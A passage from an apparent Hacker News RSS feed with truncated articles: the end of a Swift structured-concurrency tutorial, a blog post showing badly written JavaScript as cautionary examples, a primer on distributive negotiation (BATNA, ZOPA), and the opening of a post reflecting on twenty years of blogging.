</span><span>        </span><span>let</span><span> </span><span>task</span><span> </span><span>=</span><span> </span><span>URLSession</span><span>.shared.dataTask</span><span>(</span><span>with</span><span>:</span><span> </span><span>URL</span><span>(</span><span>string</span><span>:</span><span> </span><span>url</span><span>)</span><span>!</span><span>)</span><span> </span><span>{</span><span> </span><span>data</span><span>,</span><span> </span><span>_</span><span>,</span><span> </span><span>error</span><span> </span><span>in</span><span>
</span><span>            </span><span>switch</span><span> </span><span>(</span><span>data</span><span>,</span><span> </span><span>error</span><span>)</span><span> </span><span>{</span><span>
</span><span>            </span><span>case</span><span> </span><span>let</span><span> </span><span>(</span><span>_</span><span>,</span><span> </span><span>error</span><span>?</span><span>):</span><span>
</span><span>                </span><span>return</span><span> </span><span>c</span><span>.resume</span><span>(</span><span>throwing</span><span>:</span><span> </span><span>error</span><span>)</span><span>
</span><span>            </span><span>case</span><span> </span><span>let</span><span> </span><span>(</span><span>data</span><span>?</span><span>,</span><span> </span><span>_</span><span>):</span><span>
</span><span>                </span><span>return</span><span> </span><span>c</span><span>.resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>data</span><span>)</span><span>
</span><span>            </span><span>case</span><span> </span><span>(</span><span>nil</span><span>,</span><span> </span><span>nil</span><span>):</span><span>
</span><span>                </span><span>c</span><span>.resume</span><span>(</span><span>throwing</span><span>:</span><span> </span><span>UnknownError</span><span>())</span><span>
</span><span>            </span><span>}</span><span>
</span><span>        </span><span>}</span><span>
</span><span>        </span><span>task</span><span>.resume</span><span>()</span><span>
</span><span>    </span><span>}</span><span>
</span><span>}</span></code></pre>
    </div>
<p>Here the continuation <code>c</code> argument of the closure passed to <code>withUnsafeThrowingContinuation</code> becomes
your “callback”. You have to call <code>resume</code> on it exactly once with either a success value or an
<code>Error</code> value. Multiple calls to <code>resume</code> on the same continuation are invalid, since
<code>async</code> functions can’t throw or return more than once. If you don’t ever call <code>resume</code> on the
continuation you’ll get a function that never returns or throws, which is just as wrong as throwing
or returning more than once.</p>
<h3>The entry point</h3>
<p>As you probably noticed, in previous examples we got <code>async</code> functions, but how do you actually call them from
non-<code>async</code> code? Currently, the <code>runAsyncAndBlock</code> function is an entry point you would use to
interact with an <code>async</code> function from your blocking synchronous code:</p>

    <div data-language="swift">
      <pre><code><span>runAsyncAndBlock</span><span> </span><span>{</span><span>
</span><span>    </span><span>print</span><span>(</span><span>"task started"</span><span>)</span><span>
</span><span>    </span><span>let</span><span> </span><span>data</span><span> </span><span>=</span><span> </span><span>try</span><span>!</span><span> </span><span>await</span><span> </span><span>download</span><span>(</span><span>"https://httpbin.org/uuid"</span><span>)</span><span>
</span><span>    </span><span>print</span><span>(</span><span>String</span><span>(</span><span>data</span><span>:</span><span> </span><span>data</span><span>,</span><span> </span><span>encoding</span><span>:</span><span> </span><span>.utf8</span><span>)</span><span>!</span><span>)</span><span>
</span><span>}</span><span>
</span><span>print</span><span>(</span><span>"end of main"</span><span>)</span></code></pre>
    </div>
<p>Note that in the current toolchain (<code>DEVELOPMENT-SNAPSHOT-2021-01-12-a</code> at the moment of writing)
<code>runAsyncAndBlock</code> does not take throwing closures as arguments, thus <code>try!</code> or <code>do</code>/<code>catch</code> blocks
are required to call a throwing <code>async</code> function such as <code>download</code>.</p>
<p>The <code>print</code> statements here are added so that you can observe the execution sequence and to make sure
that your <code>async</code> code is actually called.</p>
<p>Remember that you should not use <code>runAsyncAndBlock</code> in your GUI code running on the
main thread, as it will block the event loop from processing any input from your user. This will
result in your app being frozen until the <code>async</code> closure body has finished. In a CLI app that
doesn’t expect any input this is fine though. In GUI apps you’d either have to call <code>runAsyncAndBlock</code>
on a background thread that can be blocked, or use async handlers or actors to host your async code.
Given that proposals for async handlers and actors aren’t available yet, we’re leaving those
advanced topics out, and focus on a simple command-line app here.</p>
<h3>Launching concurrent tasks with “async let”</h3>
<p>Let’s say you need to fetch UUIDs for multiple entities, but you can only get a single one through
an asynchronous call. In some naive implementation you would <code>await</code> for async calls repeatedly
one by one until you fetch all of the data. This is highly inefficient if these calls are independent
and can all run simultaneously without disrupting each other.</p>
<p>You can launch multiple async tasks concurrently with <code>async let</code> declarations. Then if you need to
wait for all of them to complete, just use a single <code>await</code> marker on both of the values that
were declared with <code>async let</code>:</p>

    <div data-language="swift">
      <pre><code><span>func</span><span> </span><span>childTasks</span><span>()</span><span> </span><span>async</span><span> </span><span>throws</span><span> </span><span>-&gt;</span><span> </span><span>String</span><span> </span><span>{</span><span>
</span><span>    </span><span>print</span><span>(</span><span>"\(</span><span>#function</span><span>) started"</span><span>)</span><span>

</span><span>    </span><span>async</span><span> </span><span>let</span><span> </span><span>uuid1</span><span> </span><span>=</span><span> </span><span>download</span><span>(</span><span>"https://httpbin.org/uuid"</span><span>)</span><span>
</span><span>    </span><span>async</span><span> </span><span>let</span><span> </span><span>uuid2</span><span> </span><span>=</span><span> </span><span>download</span><span>(</span><span>"https://httpbin.org/uuid"</span><span>)</span><span>

</span><span>    </span><span>return</span><span> </span><span>try</span><span> </span><span>await</span><span> </span><span>"""</span><span>
</span><span>    ids fetched conncurrently:</span><span>
</span><span>    uuid1: \(</span><span>String</span><span>(</span><span>data</span><span>:</span><span> </span><span>uuid1</span><span>,</span><span> </span><span>encoding</span><span>:</span><span> </span><span>.utf8</span><span>)</span><span>!</span><span>)</span><span>
</span><span>    uuid2: \(</span><span>String</span><span>(</span><span>data</span><span>:</span><span> </span><span>uuid2</span><span>,</span><span> </span><span>encoding</span><span>:</span><span> </span><span>.utf8</span><span>)</span><span>!</span><span>)</span><span>
</span><span>    """</span><span>
</span><span>}</span></code></pre>
    </div>
<p>Here two separate <code>uuid1</code> and <code>uuid2</code> tasks are launched concurrently, and they don’t block each
other. The <code>try! await</code> markers before <code>print</code> mean that <code>print</code> won’t evaluate before both of the
tasks have completed. Compare this with the old
<a href="https://developer.apple.com/documentation/dispatch"><code>Dispatch</code></a> approach, where instead of <code>async let</code> you’d have to set up a
<a href="https://developer.apple.com/documentation/dispatch/dispatchgroup"><code>DispatchGroup</code></a> instance, which
is much more cumbersome to work with.</p>
<h3>Cancellation</h3>
<p>Tasks launched with <code>async let</code> are called <em>“child tasks”</em>, and this is important when you think
about cancellation. <code>async let</code> forms an implicit task hierarchy which reflects call stacks of async
functions. In the code above <code>await childTasks()</code> launches one parent task, which then spawns two
more child tasks for <code>download</code> calls. When a parent task is cancelled, its child tasks are
cancelled too.</p>
<p>The most critical thing to highlight is that cancellation with Swift’s structured concurrency is
cooperative, i.e. tasks need to “cooperate” in an explicit way to get cancelled as early as
possible. This is done with <code>checkCancellation()</code> and
<code>isCancelled()</code> static functions declared on the <code>Task</code> type from the <code>_Concurrency</code> module:</p>

    <div data-language="swift">
      <pre><code><span>extension</span><span> </span><span>Task</span><span> </span><span>{</span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>static</span><span> </span><span>func</span><span> </span><span>isCancelled</span><span>()</span><span> </span><span>async</span><span> </span><span>-&gt;</span><span> </span><span>Bool</span><span>

</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>struct</span><span> </span><span>CancellationError</span><span>:</span><span> </span><span>Error</span><span> </span><span>{</span><span>
</span><span>    </span><span>
</span><span>    </span><span>init</span><span>()</span><span> </span><span>{}</span><span>
</span><span>  </span><span>}</span><span>

</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>static</span><span> </span><span>func</span><span> </span><span>checkCancellation</span><span>()</span><span> </span><span>async</span><span> </span><span>throws</span><span>
</span><span>}</span></code></pre>
    </div>
<p>Why do you need to call these functions instead of the concurrency runtime just cancelling tasks
automatically? The runtime doesn’t know what your task is doing, it may need to save and close a
file handle, save the state of an expensive computation, or do whatever cleanup is needed.
Cancelling tasks preemptively would lead to much more complexity, while forcing tasks to account
for possible cancellation at any arbitrary line of code.</p>
<p>A <code>try await Task.checkCancellation()</code> call executed within a task will throw
<code>Task.CancellationError</code> if this task was previously cancelled, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://desiatov.com/swift-structured-concurrency-introduction">https://desiatov.com/swift-structured-concurrency-introduction</a></em></p>]]>
            </description>
            <link>https://desiatov.com/swift-structured-concurrency-introduction</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776245</guid>
            <pubDate>Thu, 14 Jan 2021 13:54:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst pieces of code I’ve ever seen]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776220">thread link</a>) | @scastiel
<br/>
January 14, 2021 | https://www.jesuisundev.com/en/the-worst-pieces-of-code/ | <a href="https://web.archive.org/web/*/https://www.jesuisundev.com/en/the-worst-pieces-of-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
<!-- Horizontal Top Article -->
<p>Today, I’m going to show you the worst pieces of code I’ve ever seen. Some devilries that should never be produced! Unless you want to be hated by your colleagues and your users. We’ll see that with a few good practices, it’s easy to avoid them.</p>



<h3>Devilry</h3>



<p><strong>There’s a difference between code that needs to be improved and what I call a devilry.</strong></p>



<p>No matter the language, a devilry is a dirty piece of code that endangers the stability and maintainability of the project. And I can tell you that I’ve seen a lot of devilry.</p>



<p>When it piles up, your project quickly becomes like the basement of hell. And if you’re the one who’s making a mess everywhere, the lead tech in the kitchen is going to start looking at you differently.</p>



<figure><img src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F06.2F05.2F4ba31c44-4b82-42c0-97cf-b528db6fc8a4.2Ejpeg/2048x1152/quality/80/cauchemar-en-cuisine-un-candidat-raconte-l-apocalypse-du-tournage-avec-philippe-etchebest.jpeg" data-src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F06.2F05.2F4ba31c44-4b82-42c0-97cf-b528db6fc8a4.2Ejpeg/2048x1152/quality/80/cauchemar-en-cuisine-un-candidat-raconte-l-apocalypse-du-tournage-avec-philippe-etchebest.jpeg" alt=""></figure>



<h3>Ambiguity and inconsistency</h3>



<p><strong>A long time ago, in a galaxy far, far away</strong>, I arrived one morning and was jumped on as if it was the end of the world.</p>



<p>A huge bug in prod. All the system tickets in production return “null” for no reason. <strong>Chaos everywhere. </strong>Everyone was running around like headless chickens.</p>



<p>I sprint to my station and first reflex, I look at Kibana. No logs.No nothing. Fuck, this is not a good start.</p>



<p>So I decide to retrace the path of creation of the ticket.</p>



<p>To do so, I have to go into the depths of internals libraries that have been around since the Jurassic era. At the end of my archaeological work, I arrive in one of the responsible files.</p>



<p><strong>And i saw this</strong></p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// use id and expire to get ticket
async function get_ticket(i, expire) {
  return CheckisNotExp(expire).then(async function() {
    var t = await GetTicketModel(i)
    if (t) {
      return t
    } else {
      logger.error(JSON.stringify(t))
      return null
    }
  }).catch(async function(e)  {
      logger.error(JSON.stringify(e))
      return null
})
}</pre>



<figure id="block-a351ed13-b796-4b89-ad82-7c679c353d72"><img src="https://pbs.twimg.com/media/ETkK_9DXkAEmUlg.jpg" data-src="https://pbs.twimg.com/media/ETkK_9DXkAEmUlg.jpg" alt="oof"></figure>



<p><em>Is there really an “i” variable ? Where are we now? That’s an id, right? Integer or UUID? And what exactly is expire? Is it a date or a timestamp? Why is there camelCase, PascalCase and snake_case? Async notation with promises and async notation again? If something fails we return null? DEVILRY!</em></p>



<hr>



<p>At this moment, half the company Skype me every 5 minutes to get an ETA for the fix.</p>



<p><strong>So first, git blame, someone need to know what’s going on here.</strong></p>



<p>I quickly realized that it’s not one person who is responsible, but three. Two people have left the company a long time ago, the third hasn’t arrived yet this morning. Classic scenario.</p>



<p>According to Git, these three people have touched this file at very distant times. Hence the inconsistency, the different styles, the different ECMAScript versions and the different ways of handling promises.</p>



<p>I take this opportunity to suggest you the best conference on promises I’ve ever seen.</p>



<figure><p>
<iframe title="Broken Promises" width="940" height="529" src="https://www.youtube.com/embed/e3Nh350b6S4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p><strong>I was in the room at this conference!</strong> I know, nobody care.</p>



<p>Anyway, in this piece of code, everything is ambiguous, everything is inconsistent. <strong>It’s a perfect example of what you should avoid at all costs.</strong> Needless to say, the code review didn’t go through that.</p>



<p><strong>Well now, we have to rewrite this quickly.</strong></p>



<p>I’m changing the names of the variables and functions. No ambiguity allowed. Async / Await everywhere and in the same way.</p>



<p>I’m also making sure I don’t hide any errors under the mat with a null return. These errors must break the function if something goes wrong. Exceptions should be handled by the layer above.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// hotfix
// @todo rewrite the ticket module entirely
async function getTicket(ticketUuid, ticketExpirationTimestamp) {
  await validTicketExpiration(ticketUuid, ticketExpirationTimestamp)
  const ticket = await getTicketByUuid(ticketUuid)

  return ticket
}</pre>



<p>The really good solution would be to rewrite part of the module. <strong>The ticket validation logic is bad here.</strong> But it’s not urgent.</p>



<p>The urgency is to spot and fix the error.</p>



<p>And right after updating the code, the real error starts to show its face. <strong>A configuration change made the day before had changed the ticket creation behavior.</strong> Returning to the previous configuration immediately fixed the problem.</p>



<p>The following week, the module in question was completely rewritten.</p>



<h3>Spaghetti Bolognese</h3>



<p><strong>A long time ago, in a galaxy far, far away</strong>, I was working on a product with a clean, square code.</p>



<p>Like any good product, everything was optimized inside. Features made with as little code as possible. A strong attention to readability. A strict follow up of all good practices ensured by a code review managed by clean code nazis.</p>



<p><a href="https://www.youtube.com/watch?v=rtmFCcjEgEw" target="_blank" rel="noreferrer noopener">SOLID</a>, <a href="https://thevaluable.dev/dry-principle-cost-benefit-example/" target="_blank" rel="noreferrer noopener">DRY</a>, <a href="https://dzone.com/articles/software-design-principles-dry-and-kiss" target="_blank" rel="noreferrer noopener">KISS</a>, <a href="https://medium.com/better-programming/yagni-you-aint-gonna-need-it-f9a178cd8e1" target="_blank" rel="noreferrer noopener">YAGNI</a> and every other acronym you can think of.</p>



<p>It was so clean, you could have eaten off the floor.</p>



<p><strong>Even so, a very specific part of the product would break intermittently.</strong></p>



<figure><img src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F11.2F27.2F6ead848d-34f3-49f8-ac8a-c7be1999e7b8.2Ejpeg/753x565/cr/wqkgTTYgLyBWb2ljaQ%3D%3D/focus-point/919%2C651/video-objectif-top-chef-philippe-etchebest-perturbe-par-une-candidate-americaine-de-54-ans.jpg" data-src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F11.2F27.2F6ead848d-34f3-49f8-ac8a-c7be1999e7b8.2Ejpeg/753x565/cr/wqkgTTYgLyBWb2ljaQ%3D%3D/focus-point/919%2C651/video-objectif-top-chef-philippe-etchebest-perturbe-par-une-candidate-americaine-de-54-ans.jpg" alt=""></figure>



<p>During a sprint, I eventually managed to negotiate time to investigate the case.</p>



<p>Very quickly, I realize that the problem is not the product. <strong>Errors have only one thing in common: a dependency.</strong> An internal dependency solved via an internal <a href="https://jfrog.com/artifactory/" target="_blank" rel="noreferrer noopener">artifactory</a>.</p>



<p>It is managed by another team and – very surprisingly – the code is not freely available. You have to ask a permission to see it. So I ask for access to understand what’s going on.</p>



<p><strong>I then receive a slack message or I’m asked why I want access.</strong></p>



<p>“-Hi! Why do you need access on this repository ?”<br>“-What do you mean why? Are you aware that I work here? Hold on, I’m on my way.”</p>



<p>After a surprise armlock on the person, I end up having access to the project.</p>



<p>I see a single file in it. 300 Ko in size. 300 Ko of text, it’s huge. It hasn’t been touched for several years. The name of the person who last touched it is completely unknown to me.</p>



<p>The worst devilry.</p>



<p><strong>The biggest spaghetti code I’ve ever seen in my life.</strong> For the sake of length, and to preserve your sanity, I’m not putting everything in. Just a very short excerpt of what I saw inside.</p>



<p>Careful, it stings the eyes.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Thousands of lines of spaghetti codes

if (global.Builder)
{
    module.exports.buildPgs = function(pgs, options, limitNodes = 0)
    {
        var config = options.config || {};
        var builded = [];
        pgs.each(function(pg)
        {
            var supported = pg.prop('tagName') == "INPUT"
                            &amp;&amp; pr.attr['name'] == "file"
                            &amp;&amp; options.pgs.rel.active == ""
                            &amp;&amp; global.FileReader;
            if (!supported || !pg.f || pg.f.length == 0)
                return;
            
            for (var i = 0; i &lt; pg.f.length; i++)
            {
                builded.push({
                    file: pg.f[i],
                    instanceConfig: _.extend({}, config)
                });
                
                if (isFunction(options.before))
                {
                    var returned = options.before(pg.f.path);
                    if (typeof returned === 'object' &amp;&amp; global.status.in_progress)
                    {
                        if (returned.action == "skip")
                        {
                            var needsSkip = (typeof global.status.in_progress === 'boolean' &amp;&amp; global.status.in_progress)
                                            || _.hasAny("cancel", Global._quotes.BAD_DELIMITERS)
                                            || str.indexOf(Global._delimiter) &gt; -1;
                            
                            if(needsSkip) return;
                        }
                        else if (typeof returned.config === 'object')
                        {
                            var LOCAL_BUILDER = new global.Builder("/builder/" + options.module + "/" + options.module + );
                            
                            for(var s=p,a=p.matchIndex(o),shift=0,i=0;i&lt;a.length;i++){
                                var deepcopyfile = JSON.parse(JSON.stringify(pg.f[i].getRawValue()));
                                LOCAL_BUILDER.build(deepcopyfile)
                                LOCAL_BUILDER.onmessage = global.Notification("buildPg", deepcopyfile);
                            }
                        }
                    }
                }
            }
        });
    }
}

// Thousands of lines of spaghetti codes</pre>



<figure><img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://s.yimg.com/ny/api/res/1.2/PHY850kbet.Llr9vBQvkHQ--~A/YXBwaWQ9aGlnaGxhbmRlcjtzbT0xO3c9ODAw/https://media.zenfs.com/fr/voici.fr/11e2b5d91a77141eacac3c01306619ed" alt=""></figure>



<p><strong>I didn’t even try to touch this demon child.</strong></p>



<p>In a case like this, the solution is not through the code. I called a meeting with my team araound a table to explain the situation. My plan was simple.</p>



<p><strong>We don’t touch it. </strong></p>



<p>We replace this satanic dependency with an open-source module that is already available. As always, there was a major problem. It was necessary to work a little to plug the new dependency correctly.</p>



<p>The rapid investigation was turning into a big task of several days.</p>



<p><strong>The scrum master at the other end of the table was furious.</strong> The more the discussion went on, the more I felt that it was going to be difficult to avoid touching the damn thing. And as I presented it, the discussion ended with a no.</p>



<p><em>“You just touch the minimum to fix the module and we’ll move on.”</em></p>



<p>So I did what developers should do more for code quality and sustainability of projects over time. <strong>I said no.</strong> I even went further.</p>



<p>For the first and only time in my career, I said I was ready to resign if I was forced to.</p>



<p>They obviously asked other developers. <strong>Everyone refused.</strong></p>



<p>Because of the seriousness of all this, I was given time to replace the module. I developed a <a href="https://refactoring.guru/design-patterns/adapter" target="_blank" rel="noreferrer noopener">small adapter</a> for the open source dependency. Then I got rid of the cursed dependency.</p>



<p>The product worked like a charm after that.</p>



<p>If developers talk so much about spaghetti code, there’s a good reason for that. <strong>It’s the worst kind of code you can work on. </strong></p>



<p>It doesn’t require a huge investment to make sure you avoid it.</p>



<h3>Exorcism</h3>



<p>Originally, this article was intended to be a list of best practices.</p>



<p><em>“Why and how to apply good practices as a developer.”</em></p>



<p>Apart from the fact that this title has the same effect as a high-dose sleeping pill, I changed my plans for two reasons.</p>



<p>First, I find it more interesting – for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jesuisundev.com/en/the-worst-pieces-of-code/">https://www.jesuisundev.com/en/the-worst-pieces-of-code/</a></em></p>]]>
            </description>
            <link>https://www.jesuisundev.com/en/the-worst-pieces-of-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776220</guid>
            <pubDate>Thu, 14 Jan 2021 13:52:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Negotiate Anything in 3 Simple Steps]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776084">thread link</a>) | @montreal_prof
<br/>
January 14, 2021 | https://reyt.net/blog/how-to-negotiate-anything-in-3-simple-steps/ | <a href="https://web.archive.org/web/*/https://reyt.net/blog/how-to-negotiate-anything-in-3-simple-steps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article id="post-1847"><div><p>Imagine that you are trying to sell your old laptop, and you are meeting an interested buyer later today. You want to make a good deal, but what’s a “good” deal, really? You can’t rely only on your impressions or your gut feeling; that’s the best way to regret the deals you make. Instead, you need reference points and simple decision-making rules.</p><p>The negotiation in our scenario focuses on a single issue: the price of the laptop. We refer to such negotiations as&nbsp;<span>distributive</span>&nbsp;because one party’s gain is the other party’s loss. Said differently, distributive negotiations determine how fixed resources, such as money, are split.</p><p>Using the laptop scenario, I will introduce you to the common parameters of distributive negotiations. Combined, these parameters will help you make good decisions when you negotiate. Ready? Go!</p><h3><strong>Step 1. What do you want from this negotiation?</strong></h3><p>Set yourself an ambitious, yet reachable goal. It would be great if the buyer offered you the original price you paid for the computer, but that’s not realistic. To keep things simple, let’s guesstimate a number together.</p><p>You bought the laptop new 18 months ago for $2,600. The warranty is only available for another 6 months, which is an issue you need to factor in. You believe the laptop is still in good condition, however, so you hope to sell it for $1,600.</p><p>In negotiation terms, $1,600 represents your&nbsp;<span>aspiration point</span>, the amount of money you will get from the buyer if everything goes your way.</p><h3><strong>Step 2. What’s your exit rule?</strong></h3><p>Determine the lowest amount of money you’re willing to accept for your laptop. The number you choose depends on the alternatives you have and how bad you need the money.</p><p>Let’s pretend that you made an online submission yesterday to a computer store, and they offered you $1,000. The offer is not a&nbsp;<em>great</em> alternative in your opinion, but it’s the only one you have so it’s your&nbsp;<em>best</em> alternative. Negotiators call such an option your Best Alternative to a Negotiated Agreement or&nbsp;<span>BATNA</span>.</p><p>You have no interest in accepting any offer that’s worse than your BATNA. Thus, $1000 represents your&nbsp;reservation point, the amount below which you will walk away from the negotiation and turn to your best alternative.</p><h3><strong>Step 3. What does the other party want?</strong></h3><p>It takes two to tango. You don’t know the interested buyer yet, but you have every reason to believe they are an equally smart and motivated individual who’s looking for a good deal.</p><p>Although people openly discuss their aspiration points, they rarely share their BATNA. Why? Because a negotiator’s power in a distributive negotiation depends on how good their BATNA is. Think about it, you will have a much harder time getting a good deal if the buyer has excellent alternatives. The better their BATNA, the easier for them to walk away.</p><p>You won’t know their numbers before the negotiation, but these numbers do exist. Their interest is to buy your laptop for the lowest price possible, so let’s imagine that they set their aspiration point to $900. They have determined that price to be an ambitious yet reachable goal. They have a good BATNA, with an alternative seller offering them the same laptop you have for $1,300.</p><h3><strong>What does our negotiation framework look like?</strong></h3><p>We know that you are willing to accept a price between $1,000 and $1,600. We also know that the buyer is willing to pay a price between $900 and $1,300. Looking at the overlap between the two ranges, you are both willing to accept any deal between $1,000 (your reservation point as a seller) and $1,300 (i.e., the buyer’s reservation point). We call this range the Zone of Possible Agreement (<span>ZOPA</span>).</p><p>Of course, you would much prefer getting $1,300 for your old laptop than $1,000, which is your BATNA. We call the difference between the negotiated price and your BATNA, your&nbsp;<span>negotiator’s surplus</span>.</p><p>Keep an eye on your negotiator’s surplus throughout the entire negotiation. Don’t accept any deal worse than your BATNA, even if you are nervous. Focus on capturing as much surplus as you can.</p><h3><strong>What’s next?</strong></h3><p>Instead of approaching a negotiation as a vague and uncertain process, you now know how to set practical decision-making rules for yourself. This is only a starting point, however. In my next issues, I will address several important topics:</p><ul><li><span>How to prepare for negotiations</span>. In our example, your BATNA was rather weak. We will discuss how to improve your BATNA to increase your negotiation power.</li><li><span>How to make first offers</span>.&nbsp;I’ll give you advice on crafting the right first offer to maximize your negotiator’s surplus.</li><li><span>How to expand the pie</span>. Negotiations don’t have to be distributive. Bringing new issues into the negotiation can help you create more value for both negotiators.</li></ul><h2>Do You Want to Improve Your Negotiation Skills?</h2><p>Sign-up using the form below. Not ready to commit yet? Read more about my <a href="http://reyt.net/newsletter">newsletter</a>.</p></div></article></div></div>]]>
            </description>
            <link>https://reyt.net/blog/how-to-negotiate-anything-in-3-simple-steps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776084</guid>
            <pubDate>Thu, 14 Jan 2021 13:35:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[20 Years a Blogger]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25775978">thread link</a>) | @samizdis
<br/>
January 14, 2021 | https://pluralistic.net/2021/01/13/two-decades/#hfbd | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/01/13/two-decades/#hfbd">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1756">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
process, blogging, pluralistic, recursion, navel-gazing , blogging, history, boing boing, process, anittrust, ftc, antitrust, trustbusting, thanks obama, pluralistic, reflections

Summary:
20 years a blogger; Will Biden bust trusts?

URL:
https://pluralistic.net/2021/01/13/two-decades/

Title:
Pluralistic: 13 Jan 2021 two-decades

Bullet:
🎋

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Naked Capitalism (https://nakedcapitalism.com/).

--><br>
<a href="https://pluralistic.net/2021/01/13/two-decades/"><img src="https://i0.wp.com/craphound.com/images/13Jan2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/13Jan2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/13/two-decades/#hfbd">20 years a blogger</a>: Reflections on a lifetime of reflecting.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/13/two-decades/#thanks-obama">Will Biden bust trusts?</a>: Obama's third term would be a disaster for antitrust.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/13/two-decades/#retro">This day in history</a>: 2011, 2016, 2020
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/13/two-decades/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="hfbd"></a><br>
<img src="https://i1.wp.com/craphound.com/images/20yrs-a.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/20yrs-a.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>It's been twenty years, to the day, since I published my first blog-post.</p>
<p>I'm a blogger.</p>
<p>Blogging – publicly breaking down the things that seem significant, then synthesizing them in longer pieces – is the defining activity of my days.</p>
<p><a href="https://boingboing.net/2001/01/13/hey-mark-made-me-a.html">https://boingboing.net/2001/01/13/hey-mark-made-me-a.html</a></p>
<p>Over the years, I've been lauded, threatened, sued (more than once). I've met many people who read my work and have made connections with many more whose work  I wrote about. Combing through my old posts every morning is a journey through my intellectual development.</p>
<p>It's been almost exactly a year I left Boing Boing, after 19 years. It wasn't planned, and it wasn't fun, but it was definitely time. I still own a chunk of the business and wish them well. But after 19 years, it was time for a change.</p>
<p>A few weeks after I quit Boing Boing, I started a solo project. It's called Pluralistic: it's a blog that is published simultaneously on Twitter, Mastodon, Tumblr, a newsletter and the web. It's got no tracking or ads. Here's the very first edition:</p>
<p><a href="https://pluralistic.net/2020/02/19/pluralist-19-feb-2020/">https://pluralistic.net/2020/02/19/pluralist-19-feb-2020/</a></p>
<p>I don't often do "process posts" but this merits it. Here's how I built Pluralistic and here's how it works today, after nearly a year.</p>
<p>I get up at 5AM and make coffee. Then I sit down on the sofa and open a huge tab-group, and scroll through my RSS feeds using Newsblur.</p>
<p>I spend the next 1-2 hours winnowing through all the stuff that seems important. I have a chronic pain problem and I really shouldn't sit on the sofa for more than 10 minutes, so I use a timer and get up every 10 minutes and do one minute of physio.</p>
<p>After a couple hours, I'm left with 3-4 tabs that I want to write articles about that day. When I started writing Pluralistic, I had a text file on my desktop with some blank HTML I'd tinkered with to generate a layout; now I have an XML file (more on that later).</p>
<p>First I go through these tabs and think up metadata tags I want to use for each; I type these into the template using my text-editor (gedit), like this:</p>
<p>&lt;xtags&gt; process, blogging, pluralistic, recursion, navel-gazing &lt;/xtags&gt;</p>
